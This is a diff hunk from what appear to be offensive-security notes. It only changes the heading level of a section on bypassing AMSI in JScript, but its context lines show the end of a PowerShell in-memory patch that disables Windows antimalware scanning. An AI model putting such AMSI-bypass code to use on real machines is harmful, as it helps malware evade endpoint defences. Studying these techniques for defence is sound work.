@@ -176,7 +176,7 @@ $marshal = [System.Runtime.InteropServices.Marshal];
 $marshal::Copy($patch, 0, $lpAddress, $patch.Length);
 [Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
 ```
-# 7.6 Bypassing AMSI in JScript
+## 7.6 Bypassing AMSI in JScript
 References & Credit: 
 - HIP2019-Dominic_Chell-Cracking_The Perimeter With Sharpshooter by @Tal_Liberman
 - [Tyranid's Lair: Disabling AMSI in JScript with One Simple Trick](https://www.tiraniddo.dev/2018/06/disabling-amsi-in-jscript-with-one.html)
